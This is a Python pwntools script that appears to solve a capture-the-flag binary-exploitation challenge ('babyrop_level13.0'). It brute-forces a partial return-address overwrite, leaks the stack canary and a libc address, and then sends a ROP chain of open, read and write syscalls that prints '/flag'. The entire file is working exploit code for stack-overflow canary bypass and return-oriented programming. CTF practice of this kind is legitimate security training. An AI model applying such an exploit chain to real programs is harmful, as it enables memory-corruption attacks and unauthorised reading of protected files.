from pwn import *
for i in range(10000):
    try:
        r = process('/challenge/babyrop_level13.0')
        r.recvuntil(b'input buffer is located at: ')
        stack = int(r.recv(14),16) + 0x58
        #print(hex(stack))

        r.sendline(str(hex(stack)).encode())
        r.recvuntil(b'= 0x')
        canary = int(r.recv(16),16)
        #print(hex(canary))

        payload = b'\x00'*0x58 + p64(canary) + p64(0) + b'\x00\x50\x41'
        r.send(payload)
        r.recvuntil(b'### Goodbye!\n')
        a = r.recv(timeout=0.2)

        if b'Welcome' in a:
            r.sendline(str(hex(stack+0x10)).encode())
            r.recvuntil(b'= 0x')
            libc = int(r.recv(16),16) - 0x270b3
            #print(f'libc : {hex(libc)}')
            if (libc & 0xff) != 0:
                continue
            pop_rdi = libc + 0x26b72
            pop_rsi = libc + 0x27529
            pop_rdx_r12 = libc + 0x11c371
            pop_rax = libc + 0x4a550
            syscall = libc + 0x66229  
            buffer = stack-0x58

            payload = b'/flag\x00'.ljust(0x58,b'\x41') + p64(canary) + p64(0)
            payload += p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(buffer)+ p64(pop_rsi) + p64(0) + p64(pop_rdx_r12) + p64(0) + p64(0) + p64(syscall) #open 
            payload += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(3)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx_r12) + p64(0x40) + p64(0)  + p64(syscall) #read 
            payload += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx_r12) + p64(0x40) + p64(0)  + p64(syscall) #write
            r.send(payload)

            r.interactive()
            break

    except:
        r.close()
        continue